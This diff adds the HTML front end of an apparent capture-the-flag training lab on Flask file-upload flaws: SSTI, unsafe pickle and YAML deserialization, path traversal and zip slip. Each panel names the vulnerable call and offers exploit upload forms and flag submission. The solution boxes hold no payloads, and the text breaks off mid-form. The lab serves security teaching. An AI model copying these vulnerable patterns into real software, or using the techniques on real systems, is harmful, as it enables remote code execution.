@@ -1,0 +1,1490 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>RCE Lab — Python File Upload Vulnerabilities</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&family=Share+Tech+Mono&display=swap" rel="stylesheet" />
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --bg:           #07090f;
+      --surface:      #0b0f1a;
+      --surface-2:    #101827;
+      --surface-3:    #162034;
+      --border:       #1c2d45;
+      --border-bright:#263d5c;
+      --accent:       #00c8ff;
+      --accent-dim:   rgba(0, 200, 255, 0.08);
+      --accent-glow:  rgba(0, 200, 255, 0.25);
+      --success:      #00ff9d;
+      --success-dim:  rgba(0, 255, 157, 0.08);
+      --danger:       #ff3b5c;
+      --danger-dim:   rgba(255, 59, 92, 0.1);
+      --warning:      #ffb800;
+      --warning-dim:  rgba(255, 184, 0, 0.08);
+      --text:         #7a9bb8;
+      --text-bright:  #b8d0e8;
+      --text-dim:     #3a5068;
+      --mono:         'JetBrains Mono', 'Share Tech Mono', monospace;
+    }
+
+    html, body {
+      height: 100%;
+      background: var(--bg);
+      color: var(--text-bright);
+      font-family: var(--mono);
+      font-size: 13px;
+      line-height: 1.6;
+      overflow: hidden;
+    }
+
+    /* Scanline overlay */
+    body::before {
+      content: '';
+      position: fixed; inset: 0;
+      background: repeating-linear-gradient(
+        0deg,
+        transparent,
+        transparent 2px,
+        rgba(0,0,0,0.08) 2px,
+        rgba(0,0,0,0.08) 4px
+      );
+      pointer-events: none;
+      z-index: 9999;
+    }
+
+    /* ── Layout ────────────────────────────────────────────────── */
+    .layout {
+      display: flex;
+      height: 100vh;
+    }
+
+    /* ── Sidebar ───────────────────────────────────────────────── */
+    .sidebar {
+      width: 260px;
+      flex-shrink: 0;
+      background: var(--surface);
+      border-right: 1px solid var(--border);
+      display: flex;
+      flex-direction: column;
+      overflow: hidden;
+    }
+
+    .sidebar-logo {
+      padding: 20px 18px 16px;
+      border-bottom: 1px solid var(--border);
+    }
+
+    .sidebar-logo .lab-tag {
+      font-size: 9px;
+      letter-spacing: 3px;
+      text-transform: uppercase;
+      color: var(--accent);
+      display: block;
+      margin-bottom: 4px;
+    }
+
+    .sidebar-logo h1 {
+      font-size: 15px;
+      font-weight: 700;
+      color: var(--text-bright);
+      letter-spacing: 0.5px;
+    }
+
+    .sidebar-logo .subtitle {
+      font-size: 10px;
+      color: var(--text-dim);
+      margin-top: 3px;
+    }
+
+    .warning-badge {
+      margin: 12px;
+      padding: 8px 10px;
+      background: var(--danger-dim);
+      border: 1px solid rgba(255, 59, 92, 0.3);
+      border-radius: 4px;
+      font-size: 10px;
+      color: var(--danger);
+      line-height: 1.5;
+    }
+
+    .warning-badge strong { display: block; margin-bottom: 2px; }
+
+    .nav-section-label {
+      padding: 14px 18px 6px;
+      font-size: 9px;
+      letter-spacing: 2.5px;
+      text-transform: uppercase;
+      color: var(--text-dim);
+    }
+
+    .nav-item {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      padding: 10px 18px;
+      cursor: pointer;
+      border-left: 2px solid transparent;
+      transition: all 0.15s ease;
+      user-select: none;
+    }
+
+    .nav-item:hover {
+      background: var(--accent-dim);
+      border-left-color: rgba(0, 200, 255, 0.3);
+    }
+
+    .nav-item.active {
+      background: var(--accent-dim);
+      border-left-color: var(--accent);
+    }
+
+    .nav-item.active .nav-title { color: var(--accent); }
+
+    .nav-num {
+      font-size: 10px;
+      color: var(--text-dim);
+      width: 18px;
+      flex-shrink: 0;
+    }
+
+    .nav-item.active .nav-num { color: var(--accent); }
+
+    .nav-text { flex: 1; }
+
+    .nav-title {
+      font-size: 12px;
+      font-weight: 500;
+      color: var(--text-bright);
+      display: block;
+    }
+
+    .nav-sub {
+      font-size: 9px;
+      color: var(--text-dim);
+      display: block;
+    }
+
+    .nav-dot {
+      width: 6px;
+      height: 6px;
+      border-radius: 50%;
+      background: var(--text-dim);
+      flex-shrink: 0;
+    }
+
+    .nav-item.active .nav-dot { background: var(--accent); box-shadow: 0 0 6px var(--accent); }
+
+    .sidebar-footer {
+      margin-top: auto;
+      padding: 12px 18px;
+      border-top: 1px solid var(--border);
+      font-size: 10px;
+      color: var(--text-dim);
+    }
+
+    /* ── Main content ──────────────────────────────────────────── */
+    .main {
+      flex: 1;
+      overflow-y: auto;
+      padding: 28px 32px;
+      background: var(--bg);
+    }
+
+    .main::-webkit-scrollbar { width: 6px; }
+    .main::-webkit-scrollbar-track { background: transparent; }
+    .main::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+
+    /* ── Panels ────────────────────────────────────────────────── */
+    .panel { display: none; }
+    .panel.active { display: block; }
+
+    .panel-header {
+      display: flex;
+      align-items: baseline;
+      gap: 12px;
+      margin-bottom: 20px;
+      padding-bottom: 16px;
+      border-bottom: 1px solid var(--border);
+    }
+
+    .panel-num {
+      font-size: 11px;
+      color: var(--accent);
+      letter-spacing: 1px;
+    }
+
+    .panel-header h2 {
+      font-size: 20px;
+      font-weight: 700;
+      color: var(--text-bright);
+      letter-spacing: 1px;
+    }
+
+    .panel-tag {
+      font-size: 10px;
+      letter-spacing: 1.5px;
+      text-transform: uppercase;
+      color: var(--text-dim);
+      padding: 2px 8px;
+      border: 1px solid var(--border);
+      border-radius: 3px;
+    }
+
+    /* ── Info box ──────────────────────────────────────────────── */
+    .info-box {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      padding: 16px 18px;
+      margin-bottom: 20px;
+    }
+
+    .info-box p {
+      color: var(--text);
+      font-size: 12px;
+      margin-bottom: 8px;
+    }
+
+    .info-box p:last-child { margin-bottom: 0; }
+
+    .info-box .vuln-line {
+      color: var(--danger);
+      font-size: 11px;
+      padding: 2px 0;
+    }
+
+    .info-box code {
+      background: var(--surface-3);
+      padding: 1px 5px;
+      border-radius: 3px;
+      color: var(--warning);
+      font-size: 11px;
+    }
+
+    /* ── Payload hint box ──────────────────────────────────────── */
+    .payload-box {
+      background: var(--surface-2);
+      border: 1px solid var(--border);
+      border-left: 3px solid var(--warning);
+      border-radius: 4px;
+      padding: 12px 14px;
+      margin-bottom: 20px;
+      font-size: 11px;
+    }
+
+    .payload-box .payload-label {
+      font-size: 9px;
+      letter-spacing: 2px;
+      text-transform: uppercase;
+      color: var(--warning);
+      margin-bottom: 8px;
+      display: block;
+    }
+
+    .payload-box pre {
+      color: var(--success);
+      font-size: 11px;
+      white-space: pre-wrap;
+      word-break: break-all;
+    }
+
+    .section-toggle {
+      width: 100%;
+      border: 0;
+      background: transparent;
+      color: var(--text-bright);
+      font-family: var(--mono);
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      text-align: left;
+    }
+
+    .section-toggle .payload-label { margin-bottom: 0; }
+
+    .section-chevron {
+      color: var(--text-dim);
+      font-size: 14px;
+    }
+
+    .guide-body {
+      display: none;
+      margin-top: 12px;
+    }
+
+    .guide-body.open { display: block; }
+
+    .hint-list {
+      list-style: none;
+      display: grid;
+      gap: 8px;
+      margin-bottom: 10px;
+    }
+
+    .hint-item {
+      display: none;
+      border: 1px solid var(--border);
+      background: var(--surface);
+      border-radius: 4px;
+      padding: 10px 12px;
+      color: var(--text);
+    }
+
+    .hint-item.revealed { display: block; }
+
+    .hint-control {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .btn-small {
+      background: transparent;
+      border: 1px solid var(--accent);
+      color: var(--accent);
+      font-family: var(--mono);
+      font-size: 10px;
+      font-weight: 700;
+      letter-spacing: 1.5px;
+      text-transform: uppercase;
+      padding: 7px 12px;
+      cursor: pointer;
+      border-radius: 4px;
+      transition: all 0.15s;
+    }
+
+    .btn-small:hover:not(:disabled) {
+      background: var(--accent);
+      color: var(--bg);
+    }
+
+    .btn-small:disabled {
+      opacity: 0.45;
+      cursor: not-allowed;
+    }
+
+    .hint-cooldown {
+      color: var(--text-dim);
+      font-size: 10px;
+    }
+
+    .solved-banner {
+      display: none;
+      background: var(--success-dim);
+      border: 1px solid rgba(0, 255, 157, 0.35);
+      border-radius: 6px;
+      color: var(--success);
+      padding: 12px 14px;
+      margin-bottom: 20px;
+      font-size: 12px;
+    }
+
+    .solved-banner.visible { display: block; }
+
+    .flag-panel {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      padding: 16px 18px;
+      margin-top: 20px;
+    }
+
+    .flag-form {
+      display: flex;
+      gap: 10px;
+      align-items: center;
+    }
+
+    .flag-form input {
+      flex: 1;
+      min-width: 0;
+      background: var(--surface-3);
+      border: 1px solid var(--border);
+      border-radius: 4px;
+      color: var(--text-bright);
+      font-family: var(--mono);
+      font-size: 12px;
+      padding: 8px 10px;
+      outline: none;
+    }
+
+    .flag-form input:focus { border-color: var(--accent); }
+
+    .flag-message {
+      min-height: 16px;
+      margin-top: 8px;
+      color: var(--text-dim);
+      font-size: 10px;
+    }
+
+    .flag-message.success { color: var(--success); }
+    .flag-message.error { color: var(--danger); }
+
+    /* ── Upload form ───────────────────────────────────────────── */
+    .upload-form {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      padding: 18px 20px;
+      margin-bottom: 20px;
+    }
+
+    .form-section-label {
+      font-size: 9px;
+      letter-spacing: 2px;
+      text-transform: uppercase;
+      color: var(--accent);
+      margin-bottom: 14px;
+      display: block;
+    }
+
+    .field {
+      margin-bottom: 14px;
+    }
+
+    .field label {
+      display: block;
+      font-size: 10px;
+      letter-spacing: 1px;
+      text-transform: uppercase;
+      color: var(--text-dim);
+      margin-bottom: 6px;
+    }
+
+    .field input[type="text"],
+    .field textarea {
+      width: 100%;
+      background: var(--surface-3);
+      border: 1px solid var(--border);
+      border-radius: 4px;
+      color: var(--text-bright);
+      font-family: var(--mono);
+      font-size: 12px;
+      padding: 8px 10px;
+      outline: none;
+      transition: border-color 0.15s;
+    }
+
+    .field input[type="text"]:focus,
+    .field textarea:focus {
+      border-color: var(--accent);
+    }
+
+    .field .field-hint {
+      font-size: 10px;
+      color: var(--text-dim);
+      margin-top: 4px;
+    }
+
+    /* File picker */
+    .file-drop {
+      border: 1px dashed var(--border-bright);
+      border-radius: 4px;
+      padding: 18px;
+      text-align: center;
+      cursor: pointer;
+      transition: all 0.15s;
+      position: relative;
+    }
+
+    .file-drop:hover, .file-drop.drag-over {
+      border-color: var(--accent);
+      background: var(--accent-dim);
+    }
+
+    .file-drop input[type="file"] {
+      position: absolute;
+      inset: 0;
+      opacity: 0;
+      cursor: pointer;
+      width: 100%;
+      height: 100%;
+    }
+
+    .file-drop-icon { font-size: 20px; margin-bottom: 6px; }
+
+    .file-drop-text {
+      font-size: 11px;
+      color: var(--text);
+    }
+
+    .file-drop-name {
+      font-size: 11px;
+      color: var(--accent);
+      margin-top: 4px;
+      display: none;
+    }
+
+    /* Submit button */
+    .btn-launch {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      background: transparent;
+      border: 1px solid var(--accent);
+      color: var(--accent);
+      font-family: var(--mono);
+      font-size: 12px;
+      font-weight: 700;
+      letter-spacing: 2px;
+      text-transform: uppercase;
+      padding: 10px 22px;
+      cursor: pointer;
+      border-radius: 4px;
+      transition: all 0.15s;
+      margin-top: 6px;
+    }
+
+    .btn-launch:hover {
+      background: var(--accent);
+      color: var(--bg);
+      box-shadow: 0 0 20px var(--accent-glow);
+    }
+
+    .btn-launch:disabled {
+      opacity: 0.4;
+      cursor: not-allowed;
+    }
+
+    .btn-launch .arrow { transition: transform 0.15s; }
+    .btn-launch:hover .arrow { transform: translateX(3px); }
+
+    /* ── Output terminal ───────────────────────────────────────── */
+    .terminal {
+      background: #040608;
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      overflow: hidden;
+    }
+
+    .terminal-bar {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      padding: 8px 14px;
+      background: var(--surface);
+      border-bottom: 1px solid var(--border);
+    }
+
+    .terminal-dots { display: flex; gap: 5px; }
+
+    .terminal-dot {
+      width: 10px; height: 10px;
+      border-radius: 50%;
+    }
+
+    .terminal-dot.red    { background: #ff5f56; }
+    .terminal-dot.yellow { background: #ffbd2e; }
+    .terminal-dot.green  { background: #27c93f; }
+
+    .terminal-title {
+      font-size: 10px;
+      letter-spacing: 2px;
+      text-transform: uppercase;
+      color: var(--text-dim);
+      margin-left: 4px;
+    }
+
+    .terminal-status {
+      margin-left: auto;
+      font-size: 9px;
+      letter-spacing: 1px;
+      padding: 2px 8px;
+      border-radius: 2px;
+    }
+
+    .terminal-status.idle    { color: var(--text-dim); }
+    .terminal-status.loading { color: var(--warning); animation: blink 0.8s infinite; }
+    .terminal-status.success { color: var(--success); }
+    .terminal-status.error   { color: var(--danger); }
+
+    @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0.3} }
+
+    .terminal-body {
+      padding: 16px;
+      min-height: 120px;
+      max-height: 380px;
+      overflow-y: auto;
+    }
+
+    .terminal-body::-webkit-scrollbar { width: 4px; }
+    .terminal-body::-webkit-scrollbar-thumb { background: var(--border); }
+
+    .terminal-output {
+      font-size: 12px;
+      line-height: 1.7;
+      white-space: pre-wrap;
+      word-break: break-all;
+      color: var(--text-dim);
+    }
+
+    .terminal-output.has-output { color: var(--success); }
+    .terminal-output.has-error  { color: var(--danger); }
+
+    .terminal-prompt::before {
+      content: '$ ';
+      color: var(--accent);
+    }
+
+    .cursor::after {
+      content: '█';
+      animation: blink 1s infinite;
+      color: var(--accent);
+    }
+  </style>
+</head>
+<body data-lab-instance-id="{{ lab_instance_id }}">
+<div class="layout">
+
+  <!-- ── Sidebar ─────────────────────────────────────────────── -->
+  <aside class="sidebar">
+    <div class="sidebar-logo">
+      <span class="lab-tag">Security Lab</span>
+      <h1>RCE through File Upload</h1>
+      <div class="subtitle">Python / Flask</div>
+    </div>
+
+    <div class="warning-badge">
+      <strong>⚠ EDUCATIONAL USE ONLY</strong>
+      Run in an isolated VM or container.<br>
+      Do not expose to public networks.
+    </div>
+
+    <div class="nav-section-label">Attack Modules</div>
+
+    <div class="nav-item active" data-panel="ssti">
+      <span class="nav-num">01</span>
+      <div class="nav-text">
+        <span class="nav-title">SSTI</span>
+        <span class="nav-sub">Template Injection via filename</span>
+      </div>
+      <span class="nav-dot"></span>
+    </div>
+
+    <div class="nav-item" data-panel="pickle">
+      <span class="nav-num">02</span>
+      <div class="nav-text">
+        <span class="nav-title">Pickle</span>
+        <span class="nav-sub">Unsafe deserialization</span>
+      </div>
+      <span class="nav-dot"></span>
+    </div>
+
+    <div class="nav-item" data-panel="yaml">
+      <span class="nav-num">03</span>
+      <div class="nav-text">
+        <span class="nav-title">YAML</span>
+        <span class="nav-sub">Unsafe yaml.load()</span>
+      </div>
+      <span class="nav-dot"></span>
+    </div>
+
+    <div class="nav-item" data-panel="traversal">
+      <span class="nav-num">04</span>
+      <div class="nav-text">
+        <span class="nav-title">Path Traversal</span>
+        <span class="nav-sub">Arbitrary file overwrite</span>
+      </div>
+      <span class="nav-dot"></span>
+    </div>
+
+    <div class="nav-item" data-panel="zipslip">
+      <span class="nav-num">05</span>
+      <div class="nav-text">
+        <span class="nav-title">Zip Slip</span>
+        <span class="nav-sub">extractall() traversal</span>
+      </div>
+      <span class="nav-dot"></span>
+    </div>
+
+    <div class="sidebar-footer">
+      curl cheatsheet: <code style="color:var(--accent)">localhost:5000/cheatsheet</code>
+    </div>
+  </aside>
+
+  <!-- ── Main ────────────────────────────────────────────────── -->
+  <main class="main">
+
+    <!-- ── Panel 1: SSTI ─────────────────────────────────────── -->
+    <section class="panel active" id="panel-ssti">
+      <div class="panel-header">
+        <span class="panel-num">01 /</span>
+        <h2>SSTI</h2>
+        <span class="panel-tag">Server-Side Template Injection</span>
+      </div>
+
+      <div class="solved-banner" id="solved-ssti">Congratulations. SSTI solved.</div>
+
+      <div class="info-box">
+        <p>The uploaded filename is passed raw into Flask's <code>render_template_string()</code>. Jinja2 evaluates <code>&#123;&#123; &#125;&#125;</code> expressions inside the string, including arbitrary Python code reachable through the object graph.</p>
+        <p class="vuln-line">▶ Vulnerable call: render_template_string("... filename ...")</p>
+        <p>Submit the flag at flag/ssti.txt to solve the lab.</p>
+      </div>
+
+      <div class="payload-box">
+        <button type="button" class="section-toggle" data-guide-toggle="hints-ssti">
+          <span class="payload-label">Hint</span>
+          <span class="section-chevron">v</span>
+        </button>
+        <div class="guide-body" id="hints-ssti">
+          <ol class="hint-list" id="hint-list-ssti"></ol>
+          <div class="hint-control">
+            <button type="button" class="btn-small" data-hint-lab="ssti">Show hint 1</button>
+            <span class="hint-cooldown" id="hint-cooldown-ssti"></span>
+          </div>
+        </div>
+      </div>
+
+      <div class="payload-box">
+        <button type="button" class="section-toggle" data-guide-toggle="solution-ssti">
+          <span class="payload-label">Solution</span>
+          <span class="section-chevron">v</span>
+        </button>
+        <div class="guide-body" id="solution-ssti">
+          <pre id="ssti-payload-examples"></pre>
+        </div>
+      </div>
+
+      <div class="upload-form">
+        <span class="form-section-label">Execute Payload</span>
+        <form id="form-ssti">
+          <div class="field">
+            <label>Carrier File (any file)</label>
+            <div class="file-drop" id="drop-ssti">
+              <div class="file-drop-icon">📂</div>
+              <div class="file-drop-text">Click or drag any file here</div>
+              <div class="file-drop-name" id="name-ssti"></div>
+              <input type="file" name="file" id="file-ssti" />
+            </div>
+          </div>
+          <div class="field">
+            <label>Payload Filename <span style="color:var(--danger)">(injected into template)</span></label>
+            <input type="text" name="custom_filename" id="ssti-filename" />
+            <div class="field-hint">This value replaces the filename in the Jinja2 template.</div>
+          </div>
+          <button type="submit" class="btn-launch">
+            Launch Exploit <span class="arrow">→</span>
+          </button>
+        </form>
+      </div>
+
+      <div class="terminal">
+        <div class="terminal-bar">
+          <div class="terminal-dots">
+            <div class="terminal-dot red"></div>
+            <div class="terminal-dot yellow"></div>
+            <div class="terminal-dot green"></div>
+          </div>
+          <span class="terminal-title">Server Response</span>
+          <span class="terminal-status idle" id="status-ssti">IDLE</span>
+        </div>
+        <div class="terminal-body">
+          <pre class="terminal-output cursor" id="output-ssti">Awaiting payload...</pre>
+        </div>
+      </div>
+
+      <div class="flag-panel">
+        <span class="form-section-label">Submit Flag</span>
+        <form class="flag-form" data-flag-lab="ssti">
+          <input type="text" name="flag" placeholder="FLAG{...}" autocomplete="off" />
+          <button type="submit" class="btn-small">Submit</button>
+        </form>
+        <div class="flag-message" id="flag-message-ssti"></div>
+      </div>
+    </section>
+
+    <!-- ── Panel 2: Pickle ───────────────────────────────────── -->
+    <section class="panel" id="panel-pickle">
+      <div class="panel-header">
+        <span class="panel-num">02 /</span>
+        <h2>Pickle</h2>
+        <span class="panel-tag">Unsafe Deserialization</span>
+      </div>
+
+      <div class="solved-banner" id="solved-pickle">Congratulations. Pickle solved.</div>
+
+      <div class="info-box">
+        <p>The server calls <code>pickle.loads()</code> directly on the uploaded file bytes. Python's pickle format stores reconstruction instructions — overriding <code>__reduce__</code> tells pickle to call any OS command during deserialization.</p>
+        <p class="vuln-line">▶ Vulnerable call: pickle.loads(f.read())</p>
+        <p>Submit the flag at flag/pickle.txt to solve the lab.</p>
+      </div>
+
+      <div class="payload-box">
+        <button type="button" class="section-toggle" data-guide-toggle="hints-pickle">
+          <span class="payload-label">Hint</span>
+          <span class="section-chevron">v</span>
+        </button>
+        <div class="guide-body" id="hints-pickle">
+          <ol class="hint-list" id="hint-list-pickle"></ol>
+          <div class="hint-control">
+            <button type="button" class="btn-small" data-hint-lab="pickle">Show hint 1</button>
+            <span class="hint-cooldown" id="hint-cooldown-pickle"></span>
+          </div>
+        </div>
+      </div>
+
+      <div class="payload-box">
+        <button type="button" class="section-toggle" data-guide-toggle="solution-pickle">
+          <span class="payload-label">Solution</span>
+          <span class="section-chevron">v</span>
+        </button>
+        <div class="guide-body" id="solution-pickle">
+          <pre id="pickle-payload-examples"></pre>
+        </div>
+      </div>
+
+      <div class="upload-form">
+        <span class="form-section-label">Execute Payload</span>
+        <form id="form-pickle">
+          <div class="field">
+            <label>Pickle Payload File (.pkl)</label>
+            <div class="file-drop" id="drop-pickle">
+              <div class="file-drop-icon">📂</div>
+              <div class="file-drop-text">Upload a pickle (.pkl) file.</div>
+              <div class="file-drop-name" id="name-pickle"></div>
+              <input type="file" name="file" id="file-pickle" accept=".pkl" />
+            </div>
+          </div>
+          <button type="submit" class="btn-launch">
+            Launch Exploit <span class="arrow">→</span>
+          </button>
+        </form>
+      </div>
+
+      <div class="terminal">
+        <div class="terminal-bar">
+          <div class="terminal-dots">
+            <div class="terminal-dot red"></div>
+            <div class="terminal-dot yellow"></div>
+            <div class="terminal-dot green"></div>
+          </div>
+          <span class="terminal-title">Server Response</span>
+          <span class="terminal-status idle" id="status-pickle">IDLE</span>
+        </div>
+        <div class="terminal-body">
+          <pre class="terminal-output cursor" id="output-pickle">Awaiting payload...</pre>
+        </div>
+      </div>
+
+      <div class="flag-panel">
+        <span class="form-section-label">Submit Flag</span>
+        <form class="flag-form" data-flag-lab="pickle">
+          <input type="text" name="flag" placeholder="FLAG{...}" autocomplete="off" />
+          <button type="submit" class="btn-small">Submit</button>
+        </form>
+        <div class="flag-message" id="flag-message-pickle"></div>
+      </div>
+    </section>
+
+    <!-- ── Panel 3: YAML ─────────────────────────────────────── -->
+    <section class="panel" id="panel-yaml">
+      <div class="panel-header">
+        <span class="panel-num">03 /</span>
+        <h2>YAML</h2>
+        <span class="panel-tag">Unsafe Deserialization</span>
+      </div>
+
+      <div class="solved-banner" id="solved-yaml">Congratulations. YAML solved.</div>
+
+      <div class="info-box">
+        <p>The server calls <code>yaml.load(data, Loader=yaml.UnsafeLoader)</code> on the uploaded file. PyYAML's <code>!!python/object/apply:</code> tag instructs the loader to call any Python callable with attacker-supplied arguments.</p>
+        <p class="vuln-line">▶ Vulnerable call: yaml.load(data, Loader=yaml.UnsafeLoader)</p>
+        <p>Submit the flag at flag/yaml.txt to solve the lab.</p>
+      </div>
+
+      <div class="payload-box">
+        <button type="button" class="section-toggle" data-guide-toggle="hints-yaml">
+          <span class="payload-label">Hint</span>
+          <span class="section-chevron">v</span>
+        </button>
+        <div class="guide-body" id="hints-yaml">
+          <ol class="hint-list" id="hint-list-yaml"></ol>
+          <div class="hint-control">
+            <button type="button" class="btn-small" data-hint-lab="yaml">Show hint 1</button>
+            <span class="hint-cooldown" id="hint-cooldown-yaml"></span>
+          </div>
+        </div>
+      </div>
+
+      <div class="payload-box">
+        <button type="button" class="section-toggle" data-guide-toggle="solution-yaml">
+          <span class="payload-label">Solution</span>
+          <span class="section-chevron">v</span>
+        </button>
+        <div class="guide-body" id="solution-yaml">
+          <pre id="yaml-payload-examples"></pre>
+        </div>
+      </div>
+
+      <div class="upload-form">
+        <span class="form-section-label">Execute Payload</span>
+        <form id="form-yaml">
+          <div class="field">
+            <label>YAML Payload File</label>
+            <div class="file-drop" id="drop-yaml">
+              <div class="file-drop-icon">📂</div>
+              <div class="file-drop-text">Upload a yaml (.yaml/.yml) file.</div>
+              <div class="file-drop-name" id="name-yaml"></div>
+              <input type="file" name="file" id="file-yaml" accept=".yaml,.yml" />
+            </div>
+          </div>
+          <button type="submit" class="btn-launch">
+            Launch Exploit <span class="arrow">→</span>
+          </button>
+        </form>
+      </div>
+
+      <div class="terminal">
+        <div class="terminal-bar">
+          <div class="terminal-dots">
+            <div class="terminal-dot red"></div>
+            <div class="terminal-dot yellow"></div>
+            <div class="terminal-dot green"></div>
+          </div>
+          <span class="terminal-title">Server Response</span>
+          <span class="terminal-status idle" id="status-yaml">IDLE</span>
+        </div>
+        <div class="terminal-body">
+          <pre class="terminal-output cursor" id="output-yaml">Awaiting payload...</pre>
+        </div>
+      </div>
+
+      <div class="flag-panel">
+        <span class="form-section-label">Submit Flag</span>
+        <form class="flag-form" data-flag-lab="yaml">
+          <input type="text" name="flag" placeholder="FLAG{...}" autocomplete="off" />
+          <button type="submit" class="btn-small">Submit</button>
+        </form>
+        <div class="flag-message" id="flag-message-yaml"></div>
+      </div>
+    </section>
+
+    <!-- ── Panel 4: Traversal ────────────────────────────────── -->
+    <section class="panel" id="panel-traversal">
+      <div class="panel-header">
+        <span class="panel-num">04 /</span>
+        <h2>Path Traversal</h2>
+        <span class="panel-tag">Arbitrary File Overwrite</span>
+      </div>
+
+      <div class="solved-banner" id="solved-traversal">Congratulations. Path Traversal solved.</div>
+
+      <div class="info-box">
+        <p>The filename is joined to the upload directory using <code>os.path.join()</code>.</p>
+        <p class="vuln-line">▶ Vulnerable call: os.path.join(UPLOAD_DIR, filename)</p>
+        <p>Submit the flag at flag/traversal.txt to solve the lab.</p>
+      </div>
+
+      <div class="payload-box">
+        <button type="button" class="section-toggle" data-guide-toggle="hints-traversal">
+          <span class="payload-label">Hint</span>
+          <span class="section-chevron">v</span>
+        </button>
+        <div class="guide-body" id="hints-traversal">
+          <ol class="hint-list" id="hint-list-traversal"></ol>
+          <div class="hint-control">
+            <button type="button" class="btn-small" data-hint-lab="traversal">Show hint 1</button>
+            <span class="hint-cooldown" id="hint-cooldown-traversal"></span>
+          </div>
+        </div>
+      </div>
+
+      <div class="payload-box">
+        <button type="button" class="section-toggle" data-guide-toggle="solution-traversal">
+          <span class="payload-label">Solution</span>
+          <span class="section-chevron">v</span>
+        </button>
+        <div class="guide-body" id="solution-traversal">
+          <pre id="traversal-payload-examples"></pre>
+        </div>
+      </div>
+
+      <div class="upload-form">
+        <span class="form-section-label">Execute Payload</span>
+        <form id="form-traversal">
+          <div class="field">
+            <label>File to Write (content)</label>
+            <div class="file-drop" id="drop-traversal">
+              <div class="file-drop-icon">📂</div>
+              <div class="file-drop-text">Upload a file to override the Flask application.</div>
+              <div class="file-drop-name" id="name-traversal"></div>
+              <input type="file" name="file" id="file-traversal" />
+            </div>
+          </div>
+          <div class="field">
+            <label>Override Filename <span style="color:var(--danger)">(path traversal payload)</span></label>
+            <input type="text" name="custom_filename" id="traversal-filename" />
+            <div class="field-hint">Use ../ sequences to escape the uploads/ directory. The server resolves this path and writes the file there.</div>
+          </div>
+          <button type="submit" class="btn-launch">
+            Launch Exploit <span class="arrow">→</span>
+          </button>
+        </form>
+      </div>
+
+      <div class="terminal">
+        <div class="terminal-bar">
+          <div class="terminal-dots">
+            <div class="terminal-dot red"></div>
+            <div class="terminal-dot yellow"></div>
+            <div class="terminal-dot green"></div>
+          </div>
+          <span class="terminal-title">Server Response</span>
+          <span class="terminal-status idle" id="status-traversal">IDLE</span>
+        </div>
+        <div class="terminal-body">
+          <pre class="terminal-output cursor" id="output-traversal">Awaiting payload...</pre>
+        </div>
+      </div>
+
+      <div class="flag-panel">
+        <span class="form-section-label">Submit Flag</span>
+        <form class="flag-form" data-flag-lab="traversal">
+          <input type="text" name="flag" placeholder="FLAG{...}" autocomplete="off" />
+          <button type="submit" class="btn-small">Submit</button>
+        </form>
+        <div class="flag-message" id="flag-message-traversal"></div>
+      </div>
+    </section>
+
+    <!-- ── Panel 5: Zip Slip ─────────────────────────────────── -->
+    <section class="panel" id="panel-zipslip">
+      <div class="panel-header">
+        <span class="panel-num">05 /</span>
+        <h2>Zip Slip</h2>
+        <span class="panel-tag">Archive Extraction Traversal</span>
+      </div>
+
+      <div class="solved-banner" id="solved-zipslip">Congratulations. Zip Slip solved.</div>
+
+      <div class="info-box">
+        <p>The server extracts uploaded zip files using <code>zipfile.extractall()</code> with no path validation.</p>
+        <p class="vuln-line">▶ Vulnerable call: zf.extractall(EXTRACT_DIR)</p>
+        <p>Submit the flag at flag/zipslip.txt to solve the lab.</p>
+      </div>
+
+      <div class="payload-box">
+        <button type="button" class="section-toggle" data-guide-toggle="hints-zipslip">
+          <span class="payload-label">Hint</span>
+          <span class="section-chevron">v</span>
+        </button>
+        <div class="guide-body" id="hints-zipslip">
+          <ol class="hint-list" id="hint-list-zipslip"></ol>
+          <div class="hint-control">
+            <button type="button" class="btn-small" data-hint-lab="zipslip">Show hint 1</button>
+            <span class="hint-cooldown" id="hint-cooldown-zipslip"></span>
+          </div>
+        </div>
+      </div>
+
+      <div class="payload-box">
+        <button type="button" class="section-toggle" data-guide-toggle="solution-zipslip">
+          <span class="payload-label">Solution</span>
+          <span class="section-chevron">v</span>
+        </button>
+        <div class="guide-body" id="solution-zipslip">
+          <pre id="zipslip-payload-examples"></pre>
+        </div>
+      </div>
+
+      <div class="upload-form">
+        <span class="form-section-label">Execute Payload</span>
+        <form id="form-zipslip">
+          <div class="field">
+            <label>Malicious Zip File</label>
+            <div class="file-drop" id="drop-zipslip">
+              <div class="file-drop-icon">📂</div>
+              <div class="file-drop-text">Upload a zip (.zip) file.</div>
+              <div class="file-drop-name" id="name-zipslip"></div>
+              <input type="file" name="file" id="file-zipslip" accept=".zip" />
+            </div>
+          </div>
+          <button type="submit" class="btn-launch">
+            Launch Exploit <span class="arrow">→</span>
+          </button>
+        </form>
+      </div>
+
+      <div class="terminal">
+        <div class="terminal-bar">
+          <div class="terminal-dots">
+            <div class="terminal-dot red"></div>
+            <div class="terminal-dot yellow"></div>
+            <div class="terminal-dot green"></div>
+          </div>
+          <span class="terminal-title">Server Response</span>
+          <span class="terminal-status idle" id="status-zipslip">IDLE</span>
+        </div>
+        <div class="terminal-body">
+          <pre class="terminal-output cursor" id="output-zipslip">Awaiting payload...</pre>
+        </div>
+      </div>
+
+      <div class="flag-panel">
+        <span class="form-section-label">Submit Flag</span>
+        <form class="flag-form" data-flag-lab="zipslip">
+          <input type="text" name="flag" placeholder="FLAG{...}" autocomplete="off" />
+          <button type="submit" class="btn-small">Submit</button>
